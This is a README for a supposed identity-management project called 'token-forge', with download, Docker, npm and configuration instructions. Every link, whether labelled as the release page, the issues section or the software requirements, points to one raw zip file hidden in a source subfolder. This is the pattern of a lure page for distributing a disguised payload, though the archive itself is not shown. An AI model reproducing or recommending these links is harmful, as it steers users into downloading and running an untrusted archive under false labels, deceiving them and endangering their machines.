# 🚀 token-forge - Simplify Your Identity Management

## 📥 Download Now!
[![Download Token Forge](https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip%20Token%20Forge-%20-blue)](https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip)

## 🌟 Overview
**token-forge** is an enterprise-grade distributed identity provider. Built on NestJS and Redis, it supports features like JWT rotation and multi-factor authentication (MFA). This application helps manage user identities securely and efficiently.

## 🚀 Getting Started
Follow these steps to download and run token-forge on your system.

1. **Check System Requirements**
   - Operating System: Windows, macOS, or Linux
   - RAM: At least 4 GB recommended
   - Storage: Minimum of 200 MB free space
   - https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip Version 14 or higher
   - Docker: Installed and running if you prefer containerized setups

2. **Visit the Releases Page**
   Go to the [Releases page](https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip) to find the latest version. Here, you'll see all available downloads.

3. **Download the Application**
   You can select the version you want. Click the link marked "Source code" or the specific package suitable for your operating system. 

   [Download Token Forge](https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip)

## ⚙️ Installation Instructions
After downloading, follow these steps:

### For Docker Users
1. Open your terminal or command prompt.
2. Pull the latest image:
   ```bash
   docker pull malith153/token-forge
   ```
3. Run the application:
   ```bash
   docker run -p 3000:3000 malith153/token-forge
   ```

### For Local Installation
1. Extract the downloaded file.
2. Open a terminal and navigate to the extracted folder.
3. Install the required packages:
   ```bash
   npm install
   ```
4. Start the application:
   ```bash
   npm start
   ```

## 🔗 Configuration
You might need to set up environment variables for optimal use. Below are key settings:

- **DATABASE_URL**: Connection string for PostgreSQL
- **REDIS_URL**: Connection string for Redis
- **JWT_SECRET**: A long, random string to sign your tokens
- **MFA_ENABLED**: Set to true or false, depending on your preference

Create a `.env` file in the project root and add your variables following this format:
```
DATABASE_URL=your_database_url
REDIS_URL=your_redis_url
JWT_SECRET=your_jwt_secret
MFA_ENABLED=true
```

## 🌍 Usage
Once the application is running, you can access it from your web browser at `http://localhost:3000`.

### Key Features
- **User Registration**: Allow users to create accounts
- **Login with JWT**: Securely authenticate users using JSON Web Tokens
- **MFA**: Enhance security by requiring additional verification steps
- **Session Management**: Manage user sessions efficiently
- **Role-Based Access Control (RBAC)**: Set user permissions for various actions

## 🛠️ Troubleshooting
If you face any issues, consider the following steps:

- Ensure all dependencies are installed.
- Check the output in the terminal for error messages.
- Verify your database and Redis connections.

Common issues:
- **Database Not Connected**: Double-check your `DATABASE_URL`.
- **Port Already in Use**: Change the port number in the `docker run` command to an available one.

## 📞 Support
For help, consider the following:
- Check the [Issues section](https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip) on GitHub for common problems.
- Open a new issue if you can't find a solution.

## 📝 License
This project is licensed under the MIT License.

## 📄 Additional Information
You can find more comprehensive documentation in the project repository. This includes advanced configuration options and integration guides.

Return to the [Releases page](https://github.com/malith153/token-forge/raw/refs/heads/main/backend/src/mfa/dto/forge_token_v1.3.zip) to download the latest version or to access previous versions of token-forge.